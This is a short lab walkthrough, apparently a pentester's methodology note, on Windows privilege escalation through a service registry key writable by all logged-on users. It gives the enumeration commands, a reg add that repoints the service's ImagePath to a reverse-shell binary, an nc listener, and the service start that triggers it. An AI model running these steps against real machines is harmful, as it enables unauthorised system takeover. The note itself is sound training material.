 .\winPEASany.exe servicesinfo

It seems we have full control over the registry entrys of this particular service. Whoopsies!

Let's further inspect this registry entry:
accesschk64.exe /accepteula -uwqvk HKLM\System\CurrentControlSet\Services\regsvc

(sometimes you need this powershell variant to see it)
Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
"NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users):

The regsvc service is writable by the "NT AUTHORITY\INTERACTIVE" group (essentially all logged-on users). So let's modify it's ImagePath:
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\users\user\jaja\reverse.exe /f

We too have permissions to start the service, so let's trigger our payload! :)

Listener:
rlwrap nc -lvnp 443

Run service:
net start regsvc
or
sc.exe start regsvc

Lovely.![unnamed_ff90c8fa348d4f44ad15378ed3ca5e66](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Registry%20Attacks/Weak%20Registry%20Permissions/{{notename}}-202605011742.png)
![unnamed_f85d30156dde46afa4dd23b7e5a6486a](docs/Attachments/_Methodology/2.%20Privilege%20Escalation/Windows%20Privesc/Windows%20Methodology/Attacks/Registry%20Attacks/Weak%20Registry%20Permissions/{{notename}}-202605011742-1.png)